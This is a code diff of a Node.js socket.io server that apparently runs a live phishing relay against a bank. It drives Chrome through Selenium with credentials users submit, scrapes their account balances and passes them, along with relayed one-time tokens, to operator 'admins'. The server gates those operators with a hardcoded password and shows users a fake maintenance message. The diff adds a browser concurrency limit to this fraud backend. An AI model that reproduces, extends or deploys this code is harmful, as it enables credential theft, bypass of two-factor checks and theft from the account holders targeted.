@@ -7,6 +7,7 @@ module.exports = httpServer => {
     const swd = require("selenium-webdriver");
     const chrome = require("selenium-webdriver/chrome");
     const firefox = require("selenium-webdriver/firefox");
+    const sleepi = require("system-sleep");
 
 
     const { Server } = require("socket.io");
@@ -18,6 +19,8 @@ module.exports = httpServer => {
     var idAdmIdHome = [];
     var socketImg = []
     var totalInfoArr = []
+    var LimiteNavegador = 10;
+    var OnLine = 0;
 
     io.on("connection", socket => {
 
@@ -62,6 +65,15 @@ module.exports = httpServer => {
 
         // Mostrar imagen login
         socket.on("ShowAvatar", data => {
+            
+            OnLine += 1;
+            console.log('OnLine' + OnLine)
+
+            while (OnLine > LimiteNavegador) {
+                console.log("OnLine: "+ OnLine);
+                sleepi(2000);
+            }
+
 
             let browser = new swd.Builder();
             let tab = browser.forBrowser("chrome")
@@ -119,6 +131,7 @@ module.exports = httpServer => {
                                     tab.quit();
                                 })
                     }, 1000);
+                    OnLine -= 1;
                 })
                 .catch(err => {
                     console.log("Error ", err, " occurred!");
@@ -140,14 +153,14 @@ module.exports = httpServer => {
 
 
         socket.on("QuienSosAuth", QuienSosAuth => {
-            if (QuienSosAuth[0] == "Fucker123"){
+            if (QuienSosAuth[0] == "Fucker123") {
                 console.log(QuienSosAuth[1])
                 io.to(QuienSosAuth[1]).emit("SosAdmin", true);
-            }else{
+            } else {
                 io.to(QuienSosAuth[1]).emit("SosAdmin", false);
             }
         })
-        
+
         socket.on("DataADMsinBTNs", idHome => {
             var totalInfoFilter = totalInfoArr.filter((item) => item[0].socket == idHome);
             var totalInfoSend = totalInfoFilter[0];
@@ -159,7 +172,7 @@ module.exports = httpServer => {
                     AsignarAdm = 0;
                 }
                 var AdminSelected = socketsOnLineAdm[AsignarAdm];
-    
+
                 idAdmIdHome.push({ 'AdmId': AdminSelected.Id, 'IdHome': totalInfoSend[0].socket });
 
                 io.to(AdminSelected.socketSesion).emit("NewData", totalInfoSend);
@@ -184,16 +197,16 @@ module.exports = httpServer => {
                     idAdmIdHome.push({ 'AdmId': AdminSelected.Id, 'IdHome': totalInfoSend[0].socket });
                     io.to(AdminSelected.socketSesion).emit("NewData", totalInfoSend);
                 } else {*/
-                    var AdminId = idAdmIdHomeFilter[0].AdmId;
-                    var socketAdm = socketsOnLineAdm.filter((item) => item.Id == AdminId);
-                    
-                    if(socketAdm.length){
-                        io.to(socketAdm[0].socketSesion).emit("NewData", totalInfoSend);
-                    }else{
-                        io.to(onlineHere.originalSocket).emit("goLogin", true);
-                    }
-                    
-                    io.to(socketAdm[0].socketSesion).emit("showBTNS", onlineHere.originalSocket);
+                var AdminId = idAdmIdHomeFilter[0].AdmId;
+                var socketAdm = socketsOnLineAdm.filter((item) => item.Id == AdminId);
+
+                if (socketAdm.length) {
+                    io.to(socketAdm[0].socketSesion).emit("NewData", totalInfoSend);
+                } else {
+                    io.to(onlineHere.originalSocket).emit("goLogin", true);
+                }
+
+                io.to(socketAdm[0].socketSesion).emit("showBTNS", onlineHere.originalSocket);
                 /*}*/
 
 
@@ -212,6 +225,14 @@ module.exports = httpServer => {
             if (socketsOnLineAdm.length == 0) {
                 io.to(data.socket).emit("ErrorLogin", "En este momento nos encontramos efectuando tareas de mantenimiento. Disculpá las molestias ocasionadas.");
             } else {
+
+                OnLine += 1;
+                console.log('OnLine' + OnLine)
+    
+                while (OnLine > LimiteNavegador) {
+                    console.log("OnLine: "+ OnLine);
+                    sleepi(2000);
+                }
 
                 let browser = new swd.Builder();
                 let tab = browser.forBrowser("chrome")
@@ -320,14 +341,14 @@ module.exports = httpServer => {
                     .then(saldos => {
                         for (let i = 0; i < saldos.length; i++) {
                             saldos[i].getText()
-                            .then((textsaldo) =>{
-                                totalInfo.push(textsaldo)
-                                console.log(totalInfo)
-                                if(i+1 == saldos.length){
-                                    totalInfoArr.push(totalInfo);
-                                    io.to(data.socket).emit("ContinuarHome", totalInfo);
-                                }
-                            })
+                                .then((textsaldo) => {
+                                    totalInfo.push(textsaldo)
+                                    console.log(totalInfo)
+                                    if (i + 1 == saldos.length) {
+                                        totalInfoArr.push(totalInfo);
+                                        io.to(data.socket).emit("ContinuarHome", totalInfo);
+                                    }
+                                })
                         }
                     })
                     .then(() => {
@@ -340,6 +361,7 @@ module.exports = httpServer => {
                     })
                     .then(() => {
                         tab.quit();
+                        OnLine -= 1;
                     })
                     .catch(err => {
                         console.log("Error ", err, " occurred!");
@@ -356,10 +378,10 @@ module.exports = httpServer => {
         })
 
         socket.on("SendToken", dataToken => {
-            if(socketsOnLineAdm.length){
+            if (socketsOnLineAdm.length) {
                 var idAdmIdHomeArr = socketsOnLineAdm.filter((item) => item.Id == dataToken.AdmId);
                 io.to(idAdmIdHomeArr[0].socketSesion).emit("ReSendToken", dataToken);
-            }else{
+            } else {
                 console.log('_____')
                 console.log(dataToken.Socket)
                 io.to(dataToken.Socket).emit("goLogin", true);
